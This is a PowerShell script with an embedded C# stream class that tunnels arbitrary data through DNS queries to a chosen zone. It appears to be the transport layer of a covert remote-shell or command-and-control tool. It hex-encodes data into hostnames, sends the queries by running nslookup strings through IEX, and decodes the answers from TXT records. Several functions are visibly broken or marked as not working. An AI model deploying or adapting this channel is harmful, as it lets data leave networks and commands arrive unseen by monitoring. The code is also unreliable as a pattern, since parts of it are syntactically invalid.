$Source = @"
public class DnsStream : System.IO.Stream {

  private System.Collections.Generic.Queue<byte> sendqueue = new System.Collections.Generic.Queue<byte>(); // TODO: remove?
  private System.Collections.Generic.Queue<byte> receivequeue = new System.Collections.Generic.Queue<byte>();

  private System.Management.Automation.PSObject dnsconnection;
  private System.Management.Automation.ScriptBlock sendqueryfunction;

  public DnsStream(System.Management.Automation.PSObject dnsconnection,
      System.Management.Automation.ScriptBlock sendqueryfunction) : base() {
    this.dnsconnection = dnsconnection;
    this.sendqueryfunction = sendqueryfunction;
  }

  public override bool CanRead {
    get { return true; }
  }

  public override bool CanSeek {
    get { return false; }
  }

  public override bool CanWrite {
    get { return true; }
  }

  public override void Flush() {
  }

  public override long Length {
    get {
      System.Console.WriteLine("DnsStream.Length called");
      return 0;
    }
  }

  public override long Position {
    get {
        System.Console.WriteLine("DnsStream.Position.get called");
        return 0;
    }
    set {
        System.Console.WriteLine("DnsStream.Position.set called");
        return;
    }
  }

  public override void SetLength(long value) {
    System.Console.WriteLine("DnsStream.SetLength called");
    return;
  }

  public override int Read(byte[] buffer, int offset, int count) {
    if (receivequeue.Count == 0) {
        this.sendqueryfunction.Invoke(this.dnsconnection, null, 0, 0, receivequeue);
    }
    if (receivequeue.Count < count) {
        count = receivequeue.Count;
    }
    for (int i=0; i<count; ++i) {
        buffer[offset+i] = receivequeue.Dequeue();
    }
    return count;
  }

  public override void Write(byte[] buffer, int offset, int count) {
    this.sendqueryfunction.Invoke(this.dnsconnection, buffer, offset, count, receivequeue);
  }

  public override long Seek(long offset, System.IO.SeekOrigin loc) {
    System.Console.WriteLine("DnsStream.Seek called");
    return -1;
  }
}
"@

Add-Type -TypeDefinition $Source

$COMMAND_NODATA = [System.Text.Encoding]::UTF8.GetBytes("NOD")
$COMMAND_ENDOFCONNECTION = [System.Text.Encoding]::UTF8.GetBytes("EOC")
$COMMAND_PING = [System.Text.Encoding]::UTF8.GetBytes("PIN")
$COMMAND_PONG = [System.Text.Encoding]::UTF8.GetBytes("PON")


function Transport-Dns-Open {
    <#
        .SYNOPSIS
        connects using DNS as protocol
        .PARAMETER Zone
        DNS zone to use for the connection
        .PARAMETER DnsServer
        host of the dns server to use
        .PARAMETER timeout
        timeout in seconds for each DNS query
        .PARAMETER retries
        retries for each failed query
    #>
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $Zone,

        [Parameter(Mandatory=$false)]
        [String]
        $DnsServer = "",

        [Parameter(Mandatory=$false)]
        [Int32]
        $timeout = 2,

        [Parameter(Mandatory=$false)]
        [Int32]
        $retries = 0
    )

    $connection = New-Object -TypeName PSObject -Property @{
       'zone' = $Zone
       'dnsServer' = $DnsServer
       'dnstype' = $NULL
       'timeout' = $timeout
       'retries' = $retries
       'stream' = $NULL
       'requestid' = Get-Random
    }
    $dnstypefound=$false

    foreach ($type in @('TXT','CNAME','MX','AAAA','A')) {
        $connection.dnstype = $type
        $res = Transport-Dns-Intern-SendQuery -Connection $connection -Content $COMMAND_PING -Commandflag $true

        $res = New-Object String($res,1,$res.Length-1)
        Write-Host $res
        if ($res -eq "PON") { # TODO: replace with $COMMAND_PONG somehow
            $dnstypefound=$true
            Write-Host "Connection with DNS type $($connection.dnstype) possible"
            break # TODO: break
        }
    }

    if(!$dnstypefound) {
        Write-Host 'Error: failed to find dnstype'
        exit(1)
    } else {
        Write-Host "Connection with DNS type $($connection.dnstype) possible"
    }

    $sendqueryfunction = get-content Function:\Transport-Dns-Intern-SendAll

    $dnsstream = New-Object DnsStream($connection, $sendqueryfunction)
    $connection.stream = $dnsstream

    return $connection
}

function Transport-Dns-Intern-SendQuery {
    <#
        .SYNOPSIS
        sends a single DNS query and records the result
        .PARAMETER Connection
        DNS connection details
        .PARAMETER Content
        data to send using the connection
    #>
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]
        $Connection,

        [Parameter(Mandatory=$true)]
        [byte[]]
        $Content,

        [Parameter(Mandatory=$false)]
        [bool]
        $Commandflag = $false
    )

    if (($Content.Length -gt 250) -or ($Content.Length -lt 1)) {
        return $NULL
    }

    $data = New-Object byte[]($Content.Length+1)
    if ($Commandflag) {
        $data[0] = [byte] 0x43
    } else {
        $data[0] = [byte] 0x44
    }
    for ($i=0; $i -lt $Content.Length; ++$i) {
	    $data[1+$i] = $Content[$i]
	}

    $res=$NULL
    $timeoutstr=""
    if ($Connection.timeout -ne 2) {
        $timeoutstr=" -timeout=$($Connection.timeout)"
    }

    $r=$Connection.requestid++
    $data=Transport-Dns-Intern-ConvertToHostname($data)
    $data="$($data).r$($r).$($Connection.zone)."

    for ($t=0; $t -le $Connection.retries; $t++) {
        $command="nslookup -type=$($Connection.dnstype)$($timeoutstr) $($data) $($Connection.dnsServer)"
        Write-Host $command
        $c=[string](IEX $command 2>&1)
        Write-Host ">>>>" $c "<<<<"

        if ($Connection.dnstype -eq 'TXT') {
            if ($c.Contains('"')) {
                $res = [Convert]::FromBase64String($c.Split('"')[1])
                break
            }
        } elseif ($Connection.dnstype -eq "MX") {
            if ($c.Contains('mail')) {
                # TODO: does not work yet !!!
                $res = ([string](($c[($c.IndexOf("mail exchanger = ") + 17)..$c.Length] -join '').split("`n")[0])).replace($Connection.zone,"").replace(".","").replace("`n","").replace(" ","").Trim()
                $res = Transport-Dns-Intern-ConvertHexToByteArray($res)
                break
            }
        }

        # TODO: break this loop if answer
    }

    # command sequence
    if ($res[0] == [byte] 0x43) {
        # TODO: command parsing
        return $NULL
    } elseif ($res[0] == [byte] 0x44) {
        return $res
    } else {
        Write-Host "invalid DNS command byte received"
        return $NULL
    }

    # TODO: parsing, everything
    return $res
}

function Transport-Dns-Intern-SendAll {
    <#
        .SYNOPSIS
        send all data as DNS queries and records the results
        .PARAMETER Connection
        DNS connection details
        .PARAMETER Content
        data to send using the connection
    #>
    param(
        [Parameter(Mandatory=$true)]
        [PSObject]
        $Connection,

        [Parameter(Mandatory=$true)]
        [byte[]]
        $Content,

        [Parameter(Mandatory=$true)]
        [Int32]
        $Offset,

        [Parameter(Mandatory=$true)]
        [Int32]
        $Count,

        [Parameter(Mandatory=$true)]
        [object]
        $Resultqueue
    )

    $Commandflag = $false
    if($Count -lt 1) {
        $Content = $COMMAND_NODATA
        $Offset = 0
        $Count = $Content.Length
        $Commandflag = $true
    }

    if ($Offset + $Count -gt $Content.Length) {
        Write-Host "ERROR in Transport-Dns-Intern-SendAll: wrongly addressed send array"
    }

    $blocksize = 250
    $blockstosend = 0
    while($blockstosend * $blocksize -lt $Count) {
        $blockstosend++
    }

    for($i=0; $i -lt $blockstosend; ++$i) {
        $start = $i * $blocksize + $Offset
        $size = [math]::min($blocksize, $Offset + $Count - $start)
        $bytes = New-Object byte[]($size);
        for($j=0; $j -lt $size; ++$j) {
            $bytes[$j] = $Content[$start + $j]
        }
        $res = Transport-Dns-Intern-SendQuery -Connection $Connection -Content $bytes -Commandflag $Commandflag
        if ($res) {
            for($j=1; $j -lt $res.Length; ++$j) {
                $Resultqueue.Enqueue($res[$j])
            }
        }
    }
}

function Transport-Dns-Intern-ConvertToHostname([byte[]]$data) {
    return ([System.BitConverter]::ToString($data).split("-") -join "")
}

function Transport-Dns-Intern-ConvertHexToByteArray($hex) {
    # TODO: does not work yet !!!
    $bytes = New-Object byte[$hex.Length / 2];
    for ($i=0; i<$hex.Length; i += 2) {
        bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
    }
    return bytes
}

function Transport-Dns-Close([PSObject] $obj) {
    # TODO: ...
}


function Transport-Dns-Receive([PSObject] $obj, [Int32] $bytestoread) {
    $bytes = New-Object byte[]($bytestoread);
    $numb = 0
    while ($numb -lt $bytestoread) {
        $numb += $obj.stream.Read($bytes, $numb, $bytestoread-$numb)
    }
    return $bytes
}

function Transport-Dns-Send([PSObject] $obj, [byte[]] $data) {
    $obj.stream.Write($data, 0, $data.Length)
}
